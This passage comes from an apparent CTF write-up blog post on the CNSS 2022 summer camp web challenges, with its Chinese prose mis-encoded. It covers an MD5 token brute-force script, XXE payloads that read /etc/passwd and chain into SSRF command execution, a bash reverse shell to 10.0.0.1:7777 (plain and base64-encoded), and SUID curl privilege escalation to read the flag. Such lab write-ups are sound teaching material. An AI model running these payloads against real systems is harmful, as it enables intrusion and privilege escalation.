</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">client</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getRemoteAddr</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(!</span><span class="n">client</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">config</span><span class="o">.</span><span class="na">getAllow</span><span class="o">()))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">         <span class="k">return</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">filterChain</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">,</span> <span class="n">servletResponse</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°ï¼Œèƒ½å¤Ÿç›´æ¥è¯·æ±‚çš„æ¥å£åªæœ‰ <code>/cnss/summer/login</code> ï¼Œ åœ¨è¯·æ±‚çš„æ—¶å€™éœ€è¦ POSTçš„å†…å®¹ä¸º <code>LoginParam</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">LoginParam</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nd">@JsonProperty</span><span class="o">(</span><span class="s">&#34;us3rname&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    <span class="nd">@NotEmpty</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">String</span> <span class="n">username</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="nd">@JsonProperty</span><span class="o">(</span><span class="s">&#34;p@ssword&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    <span class="nd">@NotEmpty</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">String</span> <span class="n">password</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰€ä»¥POSTçš„å†…å®¹ä¸º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;us3rname&#34;</span><span class="p">:</span> <span class="s2">&#34;test&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  	<span class="nt">&#34;p@ssword&#34;</span><span class="p">:</span> <span class="s2">&#34;test&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿”å›ç»“æœå¦‚ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;code&#34;</span><span class="p">:</span> <span class="s2">&#34;200&#34;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Login success!&#34;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;data&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;token&#34;</span><span class="p">:</span> <span class="s2">&#34;72600e5c9b1b1340a1b52cf736636c88&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹ <code>/cnss/summer/parse</code> çš„ <code>Filter</code></p>
<p>ç»“åˆé…ç½®æ–‡ä»¶åˆ†æï¼Œ éœ€è¦å°†HTTPè¯·æ±‚æ–¹æ³•è®¾ç½®ä¸º <code>SUMMMMMER</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Objects</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(),</span> <span class="k">this</span><span class="o">.</span><span class="na">config</span><span class="o">.</span><span class="na">getMethod</span><span class="o">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>tokençš„æœ‰æ•ˆæœŸåªæœ‰5ç§’</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">now</span> <span class="o">-</span> <span class="n">timestamp</span> <span class="o">&gt;</span> <span class="k">this</span><span class="o">.</span><span class="na">config</span><span class="o">.</span><span class="na">getExpire</span><span class="o">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>éœ€è¦åœ¨è¯·æ±‚å¤´ä¸­è®¾ç½®UUIDï¼Œå¹¶ä¸”è¿™ä¸ªUUIDçš„md5çš„å‰4ä½ç­‰äºtokençš„md5çš„å‰4ä½</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span> <span class="n">token2</span> <span class="o">=</span> <span class="n">token</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">0</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">config</span><span class="o">.</span><span class="na">getAuthLen</span><span class="o">());</span>
</span></span><span class="line"><span class="cl"><span class="n">String</span> <span class="n">uuid</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">&#34;UUID&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(!</span><span class="n">Objects</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">token2</span><span class="o">,</span> <span class="n">DigestUtils</span><span class="o">.</span><span class="na">md5DigestAsHex</span><span class="o">(</span><span class="n">uuid</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="n">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">)).</span><span class="na">substring</span><span class="o">(</span><span class="n">0</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">config</span><span class="o">.</span><span class="na">getAuthLen</span><span class="o">())))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">invalidate</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸éš¾ç”¨ Python å†™å‡ºçˆ†ç ´è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">crackToken</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">table</span> <span class="o">=</span> <span class="s2">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxzyz1234567890-=!@#$%^&amp;*()_+[]</span><span class="si">{}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">table</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">table</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">table</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">table</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">md5</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                    <span class="n">md5</span><span class="o">.</span><span class="n">update</span><span class="p">((</span><span class="n">a</span> <span class="o">+</span> <span class="n">b</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="n">d</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">md5</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="n">token</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="n">d</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ ·å°±å·²ç»èƒ½è¿‡æ‰ <code>Filter</code> äº†ï¼Œæ¥ä¸‹æ¥çœ‹ä¸‹éœ€è¦å‘è¿™ä¸ªæ¥å£æäº¤çš„ <code>ParseParam</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ParseParam</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nd">@NotEmpty</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">String</span> <span class="n">username</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="nd">@NotEmpty</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">String</span> <span class="n">xml</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æäº¤ä¹‹åæœåŠ¡ç«¯ä¼šè§£æ <code>ParseParam</code> ä¸­çš„ <code>xml</code> æ˜¾ç„¶è¿™é‡Œå­˜åœ¨ <code>XXE</code> æ¼æ´ï¼Œæ„é€ xmlå¦‚ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE GVI [ 
</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ELEMENT foo ANY &gt;</span>\n
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;
</span></span><span class="line"><span class="cl"><span class="nt">&lt;List&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/List&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>èƒ½å¤ŸæˆåŠŸè¯»åˆ° <code>/etc/passwd</code> å°è¯•è¯»å– <code>/flag</code> å¤±è´¥ï¼Œè€ƒè™‘æƒé™é—®é¢˜æˆ–è€… flag ä¸åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œ</p>
<p>å†åˆ†æä¸€ä¸‹ <code>/cnss/doCmd</code> çš„ <code>Filter</code></p>
<p>åªéœ€è¦å®¢æˆ·ç«¯çš„ IP ä¸º <code>127.0.0.1</code> å°±å¯ä»¥è¯·æ±‚è¿™ä¸ªæ¥å£ï¼Œ é‚£ä¹ˆæ­£å¥½å¯ä»¥åˆ©ç”¨ <code>XXE</code> é€ æˆ <code>SSRF</code> è¯·æ±‚åˆ°è¿™ä¸ªæ¥å£</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span> <span class="n">client</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getRemoteAddr</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(!</span><span class="n">client</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">config</span><span class="o">.</span><span class="na">getAllow</span><span class="o">()))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">     <span class="k">return</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é‚£ä¹ˆå¯ä»¥æ„é€ xmlæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä¸è¿‡æ²¡æœ‰å›æ˜¾ï¼Œæ¥ä¸‹æ¥è€ƒè™‘åå¼¹shell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE GVI [ 
</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ELEMENT foo ANY &gt;</span>\n
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY xxe SYSTEM &#34;http://127.0.0.1:5000/cnss/doCmd?cmd=ls&#34; &gt;</span>]&gt;
</span></span><span class="line"><span class="cl"><span class="nt">&lt;List&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/List&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ³¨æ„åˆ°æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™æ˜¯é€šè¿‡ <code>/bin/sh</code> æ‰§è¡Œçš„ï¼Œè¿™é‡Œä¸ç¡®å®š <code>/bin/sh</code> æ˜¯é“¾æ¥åˆ° <code>bash</code> è¿˜æ˜¯ <code>dash</code> ï¼Œå¦‚æœæ˜¯  <code>dash</code> åˆ™ç›´æ¥æ‰§è¡Œä¸‹é¢çš„åå¼¹ shell çš„å‘½ä»¤ä¼šæŠ¥é”™</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.0.0.1/7777 0&gt;<span class="p">&amp;</span><span class="m">1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†å¯ä»¥æŒ‡å®šç”¨ <code>bash</code> æ‰§è¡Œï¼Œ åˆ°è¿™ä¸€æ­¥ï¼Œ å·²ç»æ‹¿åˆ°ä¸€ä¸ªäº¤äº’å¼çš„ shell äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS83Nzc3IDA+JjE<span class="o">=</span> <span class="p">|</span> base64 -d <span class="p">|</span> bash
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŸ¥çœ‹æ ¹ç›®å½•æ–‡ä»¶ï¼Œ å¯ä»¥ç¡®å®š flag ä½äº <code>/fl444444g</code> æ–‡ä»¶ï¼Œä¸è¿‡æ²¡æœ‰æƒé™è¯»å–ï¼Œè€ƒè™‘ææƒ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cnss@3a197430eee7:/app$ ls / -al
</span></span><span class="line"><span class="cl">ls / -al
</span></span><span class="line"><span class="cl">total 84
</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Aug  7 14:48 .
</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Aug  7 14:48 ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x   1 root root    0 Aug  7 14:48 .dockerenv
</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Aug  6 02:48 app
</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Aug  7 09:39 bin
</span></span><span class="line"><span class="cl">drwxr-xr-x   2 root root 4096 Jun 30 21:35 boot
</span></span><span class="line"><span class="cl">drwxr-xr-x   5 root root  360 Aug  7 14:48 dev
</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Aug  7 14:48 etc
</span></span><span class="line"><span class="cl">-rwx------   1 root root   70 Aug  5 20:44 fl444444g
</span></span><span class="line"><span class="cl">drwxr-xr-x   2 root root 4096 Jun 30 21:35 home
</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Aug  1 00:00 lib
</span></span><span class="line"><span class="cl">drwxr-xr-x   2 root root 4096 Aug  1 00:00 lib64
</span></span><span class="line"><span class="cl">drwxr-xr-x   2 root root 4096 Aug  1 00:00 media
</span></span><span class="line"><span class="cl">drwxr-xr-x   2 root root 4096 Aug  1 00:00 mnt
</span></span><span class="line"><span class="cl">drwxr-xr-x   2 root root 4096 Aug  1 00:00 opt
</span></span><span class="line"><span class="cl">dr-xr-xr-x 194 root root    0 Aug  7 14:48 proc
</span></span><span class="line"><span class="cl">drwx------   1 root root 4096 Aug  2 05:54 root
</span></span><span class="line"><span class="cl">drwxr-xr-x   3 root root 4096 Aug  1 00:00 run
</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Aug  2 01:47 sbin
</span></span><span class="line"><span class="cl">drwxr-xr-x   2 root root 4096 Aug  1 00:00 srv
</span></span><span class="line"><span class="cl">dr-xr-xr-x  13 root root    0 Aug  7 14:48 sys
</span></span><span class="line"><span class="cl">drwxrwxrwt   1 root root 4096 Aug 26 18:27 tmp
</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Aug  1 00:00 usr
</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Aug  1 00:00 var
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ï¼Œå‘ç°è¿™ä¸ªç‰ˆæœ¬å¹¶ä¸å­˜åœ¨å¯ä»¥åˆ©ç”¨çš„å†…æ ¸æ¼æ´ææƒï¼Œ è€ƒè™‘åˆ©ç”¨ <code>SUID</code> ææƒ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cnss@3a197430eee7:/app$ uname -a
</span></span><span class="line"><span class="cl">uname -a
</span></span><span class="line"><span class="cl">Linux 3a197430eee7 5.4.0-96-generic #109-Ubuntu SMP Wed Jan 12 16:49:16 UTC 2022 x86_64 GNU/Linux
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŸ¥æ‰¾å…·æœ‰ <code>SUID</code> æƒé™çš„æ–‡ä»¶ï¼Œ å‘ç° <code>curl</code> å…·æœ‰ <code>SUID</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cnss@3a197430eee7:/app$ find / -perm -u=s -type f 2&gt;/dev/null
</span></span><span class="line"><span class="cl">find / -perm -u=s -type f 2&gt;/dev/null
</span></span><span class="line"><span class="cl">/bin/su
</span></span><span class="line"><span class="cl">/bin/umount
</span></span><span class="line"><span class="cl">/bin/mount
</span></span><span class="line"><span class="cl">/usr/bin/passwd
</span></span><span class="line"><span class="cl">/usr/bin/newgrp
</span></span><span class="line"><span class="cl">/usr/bin/chsh
</span></span><span class="line"><span class="cl">/usr/bin/gpasswd
</span></span><span class="line"><span class="cl">/usr/bin/chfn
</span></span><span class="line"><span class="cl">/usr/bin/curl
</span></span><span class="line"><span class="cl">/usr/lib/openssh/ssh-keysign
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç”¨ <code>curl</code> è¯» flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cnss@3a197430eee7:/app$ curl file:///fl444444g
</span></span><span class="line"><span class="cl">curl file:///fl444444g
</span></span><span class="line"><span class="cl">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class="line"><span class="cl">                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class="line"><span class="cl">100    70  100    70    0     0  70000      0 --:--:-- --:--:-- --:--:-- 70000
</span></span><span class="line"><span class="cl">CNSS{5dc5330bbeac0192a8db6bf9b269470781e74aff192623e0419edfa0c5e2f8ad}
</span></span></code></pre></td></tr></table>
</div>
</div></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>æ›´æ–°äº 2022-08-28</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/index.md" target="_blank">é˜…è¯»åŸå§‹æ–‡æ¡£</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="åˆ†äº«åˆ° Twitter" data-sharer="twitter" data-url="https://4ever-xxxl.github.io/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/" data-title="CNSS2022å¤ä»¤è¥_WEB_Writeup" data-hashtags="CTF,WEB,Writeup"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="åˆ†äº«åˆ° Facebook" data-sharer="facebook" data-url="https://4ever-xxxl.github.io/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/" data-hashtag="CTF"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="åˆ†äº«åˆ° Hacker News" data-sharer="hackernews" data-url="https://4ever-xxxl.github.io/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/" data-title="CNSS2022å¤ä»¤è¥_WEB_Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="åˆ†äº«åˆ° Line" data-sharer="line" data-url="https://4ever-xxxl.github.io/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/" data-title="CNSS2022å¤ä»¤è¥_WEB_Writeup"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="åˆ†äº«åˆ° å¾®åš" data-sharer="weibo" data-url="https://4ever-xxxl.github.io/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/" data-title="CNSS2022å¤ä»¤è¥_WEB_Writeup"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/web/">WEB</a>,&nbsp;<a href="/tags/writeup/">Writeup</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">è¿”å›</a></span>&nbsp;|&nbsp;<span><a href="/">ä¸»é¡µ</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/" class="prev" rel="prev" title="ç¬¬ä¸€ç¯‡æ–‡ç« "><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>ç¬¬ä¸€ç¯‡æ–‡ç« </a>
            <a href="/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/" class="next" rel="next" title="å››å·çœç½‘å®‰æŠ€èƒ½å¤§èµ›2022-å¤ç°å­¦ä¹ ">å››å·çœç½‘å®‰æŠ€èƒ½å¤§èµ›2022-å¤ç°å­¦ä¹ <i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="giscus" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://giscus.app">Giscus</a>.
            </noscript></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">ç”± <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.117.0">Hugo</a> å¼ºåŠ›é©±åŠ¨ | ä¸»é¢˜ - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/4ever-xxxl" target="_blank">m1ca</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="å›åˆ°é¡¶éƒ¨">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
